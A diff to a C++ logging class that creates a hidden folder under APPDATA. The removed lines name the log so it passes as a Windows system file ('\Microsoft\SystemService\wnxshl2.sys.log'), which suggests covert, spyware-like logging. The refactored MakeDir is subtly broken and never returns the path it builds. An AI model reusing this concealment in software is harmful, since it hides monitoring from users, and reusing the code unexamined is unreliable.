@@ -4,7 +4,6 @@
 
 #define APPDATA "APPDATA"
 
-
 std::string Stream::GetPath(const std::string &dir) {
   char *buf = nullptr;
   size_t size = 0;
@@ -18,9 +17,15 @@ std::string Stream::GetPath(const std::string &dir) {
   return finalDir;
 }
 
-bool Stream::MakeDir(const std::string &path) {
-  bool ret = CreateDirectoryA(path.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
-  SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
+bool Stream::MakeDir(const std::string &path, const std::string &name, const std::string *outPathFull) {
+  const std::string final = path + name;
+  bool ret = CreateDirectoryA(final.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
+  SetFileAttributesA(final.c_str(), FILE_ATTRIBUTE_HIDDEN);
+  if (ret) {
+	outPathFull = &final;
+  } else {
+	outPathFull = nullptr;
+  }
   return ret;
 }
 
@@ -45,9 +50,9 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
   logFile->Ofstream.close();
   return true;
 }
-bool Stream::MakeFile() {
+bool Stream::MakeFile(const std::string &fileName, const std::string &path) {
   try {
-	logFile = new Stream::LogFile(Stream::GetPath(R"(\Microsoft\SystemService\)"), "wnxshl2.sys.log");
+	logFile = new Stream::LogFile(Stream::GetPath(path), fileName);
   } catch (...) {
 	return false;
   }
@@ -71,3 +76,4 @@ std::vector<std::filesystem::path> Stream::GetAllFilesInFolder(const std::string
   }
   return entryList;
 }
+
